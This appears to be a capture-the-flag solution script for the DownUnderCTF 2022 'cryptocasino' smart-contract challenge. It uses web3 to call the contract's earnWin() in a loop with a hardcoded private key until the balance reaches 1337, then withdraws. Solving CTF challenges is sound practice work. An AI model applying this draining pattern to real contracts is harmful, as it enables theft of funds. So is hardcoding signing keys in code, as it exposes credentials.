from web3 import Web3
from web3.middleware import geth_poa_middleware
import json

url = "https://blockchain-cryptocasino-424ab58b30773f5a-eth.2022.ductf.dev/"
w3 = Web3(Web3.HTTPProvider(url))
w3.middleware_onion.inject(geth_poa_middleware, layer=0)
print("Is connected? ", w3.isConnected())

with open("ResolveCasinoABI.json") as f:       #json file with the contract ABI
    ResolveCasinoABI = json.load(f)

personalAddress = "0xFD391659e29b9eCB2b7c8AC9587eDff3E0ED2AC4"
privateKey = "0x927c489ce4721190744b0946a6dbc276ce10f499d710d61dc83115c5a7a239df"
smartContractAddress = w3.toChecksumAddress("0x7763f218658c3ecEaC3178F2FdA5EF06d95d0A46")
setup = w3.eth.contract(address=smartContractAddress, abi = ResolveCasinoABI)

print("Starting Balance: ", setup.functions.balance().call())

def play():
    transaction = setup.functions.earnWin().buildTransaction({
        'gas': 70000,
        'gasPrice': Web3.toWei(40, 'gwei'), 
        'nonce': w3.eth.getTransactionCount(personalAddress)
    })      #Withdraw all the token to the sender address
    signed_txn = w3.eth.account.signTransaction(transaction, private_key=privateKey)
    w3.eth.sendRawTransaction(signed_txn.rawTransaction)
    return setup.functions.balance().call()

i = 1
while(setup.functions.balance().call() < 1337):
    val = play()
    print("Balance at play", i, ": ", val)
    i += 1

transaction = setup.functions.withdraw(1337).buildTransaction({
    'gas': 100000,
    'gasPrice': w3.toWei(40, 'gwei'), 
    'nonce': w3.eth.getTransactionCount("0xFD391659e29b9eCB2b7c8AC9587eDff3E0ED2AC4")
})      #Withdraw all the token to the sender address
signed_txn = w3.eth.account.signTransaction(transaction, private_key=privateKey)
w3.eth.sendRawTransaction(signed_txn.rawTransaction)